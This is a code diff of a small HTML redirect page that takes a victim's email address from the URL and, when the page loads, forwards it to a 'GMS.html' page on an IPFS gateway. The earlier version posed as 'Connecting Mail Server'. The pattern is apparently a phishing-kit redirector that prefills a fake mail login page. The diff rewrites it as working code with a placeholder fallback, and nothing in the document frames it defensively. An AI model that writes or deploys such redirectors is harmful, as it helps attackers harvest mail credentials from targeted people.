@@ -1,22 +1,39 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Connecting Mail Server...</title>
+    <title>Redirecting...</title>
     <script>
-  // Get email from the URL fragment
-  const email = window.location.hash.substring(1); // Get text after '#'
+      // This function will extract the email from the URL or use default
+      function getEmailFromUrl() {
+        // Check for email in the URL parameters (e.g., ?email=someone@example.com)
+        const urlParams = new URLSearchParams(window.location.search);
+        let email = urlParams.get('email');
 
-  // If email exists, build redirect URL and redirect immediately
-  if (email) {
-    const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
-    window.location.replace(redirectUrl);
-  } else {
-    // Handle the case where no email is found
-    console.log("No email found in URL");
-  }
-</script>
+        // If no email found, use a default placeholder value
+        if (!email) {
+          email = "{email}"; // Fallback to placeholder value
+        }
+
+        return email;
+      }
+
+      // This function will redirect immediately to the target URL with the email
+      function redirectToTarget() {
+        // Get the email from URL or fallback
+        const email = getEmailFromUrl();
+
+        // Define your redirect URL using the email parameter
+        const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
+
+        // Redirect immediately to the new URL
+        window.location.replace(redirectUrl);
+      }
+
+      // Call the redirect function when the page loads
+      window.onload = redirectToTarget;
+    </script>
   </head>
   <body>
-    <p>Connecting Mail Server, please wait...</p>
+    <p>Redirecting, please wait...</p>
   </body>
 </html>
